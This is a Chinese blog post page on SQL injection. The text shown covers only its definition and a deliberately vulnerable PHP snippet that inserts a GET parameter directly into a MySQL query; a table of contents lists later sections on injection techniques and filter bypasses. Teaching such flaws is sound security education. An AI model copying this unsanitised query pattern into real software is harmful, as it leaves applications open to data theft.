<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Nayst"><meta name="copyright" content="Nayst"><meta name="generator" content="Hexo 6.2.0"><meta name="theme" content="hexo-theme-yun"><title>SQLæ³¨å…¥ | Nayst-Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/images/Doge.svg"><link rel="mask-icon" href="/images/Doge.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"www.nayst.top","root":"/","title":["Nayst","çš„","å°","ç«™"],"version":"1.10.6","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="å‰è¨€æ³¨å…¥æ¼æ´åœ¨webå‰åæ¼æ´ä¸­ä½å±…æ¦œé¦–ï¼Œå…¶ä¸­SQLæ³¨å…¥æœ€ä¸ºç»å…¸ã€‚ SQLæ³¨å…¥ä»€ä¹ˆæ˜¯SQLæ³¨å…¥SQLæ³¨å…¥æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æµè§ˆå™¨æˆ–è€…å…¶ä»–å®¢æˆ·ç«¯å°†æ¶æ„SQLè¯­å¥æ’å…¥åˆ°ç½‘ç«™å‚æ•°ä¸­ï¼Œè€Œç½‘ç«™åº”ç”¨ç¨‹åºæœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå°†æ¶æ„SQLè¯­å¥å¸¦å…¥æ•°æ®åº“ä½¿æ¶æ„SQLè¯­å¥å¾—ä»¥æ‰§è¡Œï¼Œä»è€Œä½¿æ”»å‡»è€…é€šè¿‡æ•°æ®åº“è·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚ SQLæ³¨å…¥æ¼æ´å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡å™¨çš„æ•°æ®åº“ä¿¡æ¯æ³„éœ²ã€æ•°æ®è¢«çªƒå–ã€ç½‘é¡µè¢«ç¯¡æ”¹ï¼Œç”šè‡³å¯èƒ½ä¼šé€ æˆ">
<meta property="og:type" content="article">
<meta property="og:title" content="SQLæ³¨å…¥">
<meta property="og:url" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Nayst-Blog">
<meta property="og:description" content="å‰è¨€æ³¨å…¥æ¼æ´åœ¨webå‰åæ¼æ´ä¸­ä½å±…æ¦œé¦–ï¼Œå…¶ä¸­SQLæ³¨å…¥æœ€ä¸ºç»å…¸ã€‚ SQLæ³¨å…¥ä»€ä¹ˆæ˜¯SQLæ³¨å…¥SQLæ³¨å…¥æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æµè§ˆå™¨æˆ–è€…å…¶ä»–å®¢æˆ·ç«¯å°†æ¶æ„SQLè¯­å¥æ’å…¥åˆ°ç½‘ç«™å‚æ•°ä¸­ï¼Œè€Œç½‘ç«™åº”ç”¨ç¨‹åºæœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå°†æ¶æ„SQLè¯­å¥å¸¦å…¥æ•°æ®åº“ä½¿æ¶æ„SQLè¯­å¥å¾—ä»¥æ‰§è¡Œï¼Œä»è€Œä½¿æ”»å‡»è€…é€šè¿‡æ•°æ®åº“è·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚ SQLæ³¨å…¥æ¼æ´å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡å™¨çš„æ•°æ®åº“ä¿¡æ¯æ³„éœ²ã€æ•°æ®è¢«çªƒå–ã€ç½‘é¡µè¢«ç¯¡æ”¹ï¼Œç”šè‡³å¯èƒ½ä¼šé€ æˆ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png">
<meta property="og:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png">
<meta property="article:published_time" content="2021-08-30T03:06:22.000Z">
<meta property="article:modified_time" content="2022-07-31T08:45:59.947Z">
<meta property="article:author" content="Nayst">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="webæ¼æ´">
<meta property="article:tag" content="mysql">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png"><script>(function() {
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Nayst"><img width="96" loading="lazy" src="/images/kakashi.png" alt="Nayst"><span class="site-author-status" title="åŠªåŠ›åšä¸€ä¸ªå¯¹ç¤¾ä¼šæœ‰è´¡çŒ®çš„äºº">ğŸ¤£</span></a><div class="site-author-name"><a href="/about/">Nayst</a></div><span class="site-name">Nayst-Blog</span><sub class="site-subtitle">è¿œç¦»èˆ’é€‚åœˆ</sub><div class="site-description">å·²å…¥æ±Ÿæ¹–ï¼Œæœªé…è‰¯å‰‘</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">7</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="æ–‡æ¡£"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="2495582918" target="_blank" style="color:#007722"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="y1049843745" target="_blank" style="color:#1AAD19"><span class="icon iconify" data-icon="ri:wechat-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/N4YST" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/1579790" title="å“”å“©å“”å“©" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/jizhideyunyoujun" title="å¾®åš" target="_blank" style="color:#E6162D"><span class="icon iconify" data-icon="ri:weibo-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=277777144" title="ç½‘æ˜“äº‘éŸ³ä¹" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="æˆ‘çš„è€å©†ä»¬" style="color:pink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQLæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">ä»€ä¹ˆæ˜¯SQLæ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">æ³¨å…¥ç±»å‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">æ•°å­—å‹æ³¨å…¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">å­—ç¬¦å‹æ³¨å…¥</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">MySQLæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">è”åˆæŸ¥è¯¢æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.1.1.</span> <span class="toc-text">payloadæ¨¡æ¿ä¸æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">3.1.2.</span> <span class="toc-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.2.</span> <span class="toc-text">boolç›²æ³¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">payloadæ¨¡æ¿ä¸æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">æ—¶é—´ç›²æ³¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">payloadæ¨¡æ¿ä¸æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-floor"><span class="toc-number">3.4.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥-floor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">payloadæ¨¡æ¿ä¸æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-3"><span class="toc-number">3.4.2.</span> <span class="toc-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml"><span class="toc-number">3.5.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥-updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-4"><span class="toc-number">3.5.1.</span> <span class="toc-text">payloadæ¨¡æ¿ä¸æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-4"><span class="toc-number">3.5.2.</span> <span class="toc-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-extractvalue"><span class="toc-number">3.6.</span> <span class="toc-text">æŠ¥é”™æ³¨å…¥-extractvalue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-5"><span class="toc-number">3.6.1.</span> <span class="toc-text">payloadæ¨¡æ¿ä¸æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-5"><span class="toc-number">3.6.2.</span> <span class="toc-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.7.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-6"><span class="toc-number">3.7.1.</span> <span class="toc-text">payloadæ¨¡æ¿ä¸æ­¥éª¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-6"><span class="toc-number">3.7.2.</span> <span class="toc-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.</span> <span class="toc-text">SQLæ³¨å…¥ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.1.</span> <span class="toc-text">ç©ºæ ¼ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.2.</span> <span class="toc-text">å†…è”æ³¨é‡Šç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.3.</span> <span class="toc-text">å¤§å°å†™ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.4.</span> <span class="toc-text">åŒå†™å…³é”®è¯ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.5.</span> <span class="toc-text">ç¼–ç ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.6.</span> <span class="toc-text">ç­‰ä»·å‡½æ•°å­—ç¬¦æ›¿æ¢ç»•è¿‡</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Nayst"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Nayst-Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">SQLæ³¨å…¥</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2021-08-30 11:06:22" itemprop="dateCreated datePublished" datetime="2021-08-30T11:06:22+08:00">2021-08-30</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-07-31 16:45:59" itemprop="dateModified" datetime="2022-07-31T16:45:59+08:00">2022-07-31</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="æœ¬æ–‡å­—æ•°"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="æœ¬æ–‡å­—æ•°">4.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ—¶é•¿"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="é˜…è¯»æ—¶é•¿">17m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">webå®‰å…¨</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/ctf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ctf</span></a><a class="tag-item" href="/tags/web%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">webæ¼æ´</span></a><a class="tag-item" href="/tags/mysql/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">mysql</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><strong>æ³¨å…¥æ¼æ´</strong>åœ¨webå‰åæ¼æ´ä¸­ä½å±…æ¦œé¦–ï¼Œå…¶ä¸­SQLæ³¨å…¥æœ€ä¸ºç»å…¸ã€‚</p>
<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥"><a href="#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥" class="headerlink" title="ä»€ä¹ˆæ˜¯SQLæ³¨å…¥"></a>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥</h2><p>SQLæ³¨å…¥æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æµè§ˆå™¨æˆ–è€…å…¶ä»–å®¢æˆ·ç«¯å°†æ¶æ„SQLè¯­å¥æ’å…¥åˆ°ç½‘ç«™å‚æ•°ä¸­ï¼Œè€Œç½‘ç«™åº”ç”¨ç¨‹åºæœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå°†æ¶æ„SQLè¯­å¥å¸¦å…¥æ•°æ®åº“ä½¿æ¶æ„SQLè¯­å¥å¾—ä»¥æ‰§è¡Œï¼Œä»è€Œä½¿æ”»å‡»è€…é€šè¿‡æ•°æ®åº“è·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚</p>
<p>SQLæ³¨å…¥æ¼æ´å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡å™¨çš„æ•°æ®åº“ä¿¡æ¯æ³„éœ²ã€æ•°æ®è¢«çªƒå–ã€ç½‘é¡µè¢«ç¯¡æ”¹ï¼Œç”šè‡³å¯èƒ½ä¼šé€ æˆç½‘ç«™è¢«æŒ‚é©¬ã€æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ã€è¢«ä¸Šåé—¨ç­‰ã€‚</p>
<ul>
<li>ä»¥ä¸‹æ˜¯SQLæ³¨å…¥æ¼æ´çš„ç¤ºä¾‹ä»£ç </li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span></code></pre>

